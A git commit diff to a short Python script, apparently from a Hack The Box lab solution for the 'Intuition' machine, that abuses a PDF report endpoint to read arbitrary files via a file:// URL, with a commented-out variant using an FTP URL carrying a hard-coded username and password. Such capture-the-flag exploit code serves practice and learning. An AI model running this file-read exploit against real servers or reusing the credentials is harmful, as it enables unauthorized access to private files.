4c2a76ca5c133460b34b9ac391cd4d795eb16ebd
Crow <74257119+InfoSec-Crow@users.noreply.github.com>
2025-05-07 01:37:32 +0200

    Update file_read.py

--- Intuition/file_read.py
+++ Intuition/file_read.py
@@ -11,8 +11,8 @@ def create_pdf_report():
 
     'Content-Type': 'application/x-www-form-urlencoded'
     }
-    #data = f'report_url= file://{sys.argv[1]}'
-    data = f'report_url= ftp://ftp_admin:u3jai8y71s2@172.21.0.1/{sys.argv[1]}'
+    data = f'report_url= file://{sys.argv[1]}'
+    #data = f'report_url= ftp://ftp_admin:u3jai8y71s2@172.21.0.1/{sys.argv[1]}'
     r = requests.post('http://dashboard.comprezzor.htb/create_pdf_report', cookies=cookies, headers=headers, data=data, verify=False,)
     with open('report.pdf', 'wb') as f:
         f.write(r.content)
